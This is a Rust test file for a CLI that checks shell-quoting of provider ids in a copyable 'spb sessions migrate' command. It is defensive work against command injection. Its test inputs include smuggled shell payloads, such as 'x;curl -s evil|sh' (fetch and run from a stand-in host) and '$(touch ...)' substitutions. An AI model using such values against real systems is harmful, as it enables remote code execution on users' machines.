//! The copyable `spb sessions migrate --from <provider>` command: provider ids
//! come from rollout files on the host, so anything but a plain name is
//! shell-quoted and stays one argument.

#![allow(missing_docs)]

use std::collections::BTreeMap;

use pretty_assertions::assert_eq;
use superba_core::{ProviderSessions, SessionReport, Timestamp};
use superba_switch::hosts::{migrate_command, migrate_command_for};

fn report(counts: &[(&str, u32)]) -> SessionReport {
    SessionReport {
        codex_home: "/home/dev/.codex".into(),
        scanned_at: Timestamp::now(),
        sqlite_paths: Vec::new(),
        by_provider: counts
            .iter()
            .map(|(p, n)| {
                (
                    (*p).to_owned(),
                    ProviderSessions {
                        threads: 0,
                        rollouts: *n,
                        archived: 0,
                        compressed: 0,
                        distinct: *n,
                    },
                )
            })
            .collect::<BTreeMap<_, _>>(),
        inconsistent: 0,
        warnings: Vec::new(),
    }
}

#[test]
fn plain_provider_ids_are_shown_as_they_are() {
    assert_eq!(
        migrate_command(&report(&[("openai", 236), ("krill", 12)])).as_deref(),
        Some("spb sessions migrate --from krill")
    );
    assert_eq!(
        migrate_command_for(["krill", "my-site_2.v1"]),
        "spb sessions migrate --from krill --from my-site_2.v1"
    );
    assert_eq!(migrate_command(&report(&[("openai", 3)])), None);
}

#[test]
fn other_provider_ids_are_single_quoted() {
    assert_eq!(
        migrate_command(&report(&[("openai", 1), ("x;curl -s evil|sh", 5)])).as_deref(),
        Some("spb sessions migrate --from 'x;curl -s evil|sh'")
    );
    assert_eq!(
        migrate_command_for(["it's $(id)", "a b", ""]),
        r"spb sessions migrate --from 'it'\''s $(id)' --from 'a b' --from ''"
    );
}

/// The command, run by a real POSIX shell with `spb` as a function printing
/// its arguments, gives back exactly the provider ids, and nothing else runs.
#[cfg(unix)]
#[test]
fn a_shell_sees_each_provider_id_as_one_argument() {
    let tmp = tempfile::tempdir().unwrap();
    let pwned = tmp.path().join("pwned");
    let ids = [
        "krill".to_owned(),
        format!("x;touch {}", pwned.display()),
        format!("$(touch {})", pwned.display()),
        format!("`touch {}`", pwned.display()),
        "it's".to_owned(),
        "a\nb".to_owned(),
        "*".to_owned(),
    ];
    let cmd = migrate_command_for(ids.iter().map(String::as_str));
    let script = format!("spb() {{ for a in \"$@\"; do printf '%s\\0' \"$a\"; done; }}\n{cmd}\n");
    let out = std::process::Command::new("/bin/sh")
        .arg("-c")
        .arg(&script)
        .current_dir(tmp.path())
        .output()
        .unwrap();
    assert!(out.status.success(), "{out:?}");
    let args: Vec<String> = String::from_utf8(out.stdout)
        .unwrap()
        .split_terminator('\0')
        .map(str::to_owned)
        .collect();
    let mut want = vec!["sessions".to_owned(), "migrate".to_owned()];
    for id in &ids {
        want.push("--from".to_owned());
        want.push(id.clone());
    }
    assert_eq!(args, want);
    assert!(!pwned.exists(), "a provider id ran as shell code");
}
